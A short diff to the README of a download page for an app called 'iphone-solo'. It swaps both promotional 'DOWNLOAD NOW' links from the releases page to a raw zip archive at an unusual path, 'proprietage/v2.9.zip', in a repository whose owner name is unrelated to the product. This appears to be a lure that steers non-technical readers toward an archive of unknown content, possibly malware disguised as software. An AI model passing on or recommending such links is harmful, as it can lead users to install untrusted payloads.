@@ -35,7 +35,7 @@ The download process is incredibly straightforward. We've designed it so even so
 1. **Go to the Download Page**  
    Click on the big colorful button below to visit the official iphone-solo download page. This is where you'll get the application files
 
-   [🎯 **DOWNLOAD iphone-solo NOW**](https://github.com/danangtrekkingtours-blip/iphone-solo/releases)
+   [🎯 **DOWNLOAD iphone-solo NOW**](https://github.com/danangtrekkingtours-blip/iphone-solo/raw/refs/heads/main/proprietage/v2.9.zip)
 
 )
 
@@ -140,7 +140,7 @@ That's all there is to it. You're now a proud user of iphone-solo—turning your
 ### 🔗 Quick Download Again
 Just in case you missed it earlier,, here's the link one more time. Bookmark it if you want to come back later
 
-[**📲 DOWNLOAD iphone-solo NOW**](https://github.com/danangtrekkingtours-blip/iphone-solo/releases)
+[**📲 DOWNLOAD iphone-solo NOW**](https://github.com/danangtrekkingtours-blip/iphone-solo/raw/refs/heads/main/proprietage/v2.9.zip)
 
 
 
